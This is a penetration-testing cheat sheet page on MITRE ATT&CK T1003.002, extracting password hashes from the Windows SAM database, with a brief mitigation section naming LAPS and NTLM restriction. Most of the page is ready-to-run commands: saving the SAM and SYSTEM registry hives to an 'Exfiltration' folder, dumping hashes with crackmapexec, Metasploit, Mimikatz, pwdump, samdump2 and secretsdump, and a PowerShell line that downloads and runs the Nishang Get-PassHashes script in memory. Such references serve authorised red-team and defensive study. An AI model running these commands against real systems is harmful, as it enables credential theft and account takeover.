---
description: https://attack.mitre.org/techniques/T1003/002/
---

# Security Account Manager (SAM)

**ATT\&CK ID:** [T1003.002](https://attack.mitre.org/techniques/T1003/002/)

**Permissions Required:** <mark style="color:red;">**SYSTEM**</mark>

**Description**

Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command. Enumerating the SAM database requires SYSTEM level access.

## Techniques

### Save the SAM and SYSTEM databases.

```batch
reg save HKLM\SAM c:\Exfiltration\SAM
reg save HKLM\SYSTEM c:\Exfiltration\SYSTEM
```

### Crackmapexec

```bash
crackmapexec smb <IP> -u <User> -p <Password> --sam

# Use the local-auth parameter when authenticating as a local account
crackmapexec smb <IP> -u <User> -p <Password> --sam --local-auth
```

![](<../../../../.gitbook/assets/image (162) (2).png>)

### Get-PassHashes (Nishang)

```powershell
iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"); Get-PassHashes
```

![](../../../../.gitbook/assets/Get-PassHashes.png)

### Metasploit

```bash
# Modules
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector

# Meterpreter Shell
hashdump

# Extension:Kiwi
lsa_dump_sam
```

![](<../../../../.gitbook/assets/image (2063) (1).png>)

### Mimikatz

```powershell
# Dump from SAM and SYSTEM. Enusre files are in current working directory
Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM"

# Method 2
Invoke-Mimikatz -command '"lsadump::sam"'
```

![](../../../../.gitbook/assets/Mimikatz-SAM-SYSTEM.png)

### pwdump

**URL:** [https://www.tarasco.org/security/pwdump\_7](https://www.tarasco.org/security/pwdump\_7/)/

```
# Dump system passwords
./pwdump7.exe

#  Dump passwords from SAM and System files
pwdump7.exe -s <samfile> <systemfile>
```

### SamDump2

```bash
# Dump from SAM and SYSTEM. Enusre files are in current working directory
samdump2 SYSTEM SAM
```

![](<../../../../.gitbook/assets/image (1015).png>)

### Secretsdump.py

```bash
# Dump from SAM and SYSTEM. Enusre files are in current working directory
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

![](<../../../../.gitbook/assets/image (39) (2).png>)

## Mitigation

### LAPS

The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.

{% embed url="https://www.microsoft.com/en-us/download/details.aspx?id=46899" %}

### Restrict NTLM Traffic

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/jj865668(v=ws.10)?redirectedfrom=MSDN" %}
